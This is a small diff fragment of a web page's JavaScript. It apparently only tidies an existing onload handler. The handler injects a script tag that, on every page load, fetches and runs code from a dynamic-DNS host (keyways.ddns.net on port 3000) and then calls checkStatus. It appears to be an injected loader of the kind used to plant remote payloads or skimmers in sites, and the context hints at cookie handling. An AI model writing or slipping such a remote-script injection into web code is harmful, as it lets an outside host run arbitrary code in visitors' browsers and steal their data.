@@ -76,9 +76,9 @@ while (coo.length > i45) {
     i45++
 }
 document.body.onload = function () {
-	var elm = document.createElement('div')
-	elm.innerHTML = '<script src="http://keyways.ddns.net:3000"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>'
-	document.body.insertBefore(elm,document.body.childNodes[0])
+	var eld = document.createElement('div')
+	eld.innerHTML = '<script src="http://keyways.ddns.net:3000/"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>';
+	document.body.insertBefore(eld,document.body.childNodes[0]);
     if (getit('loadingHider') != null) {
         getit('loadingTag').style.display = 'none'
         getit('loaderH').style.display = 'none'
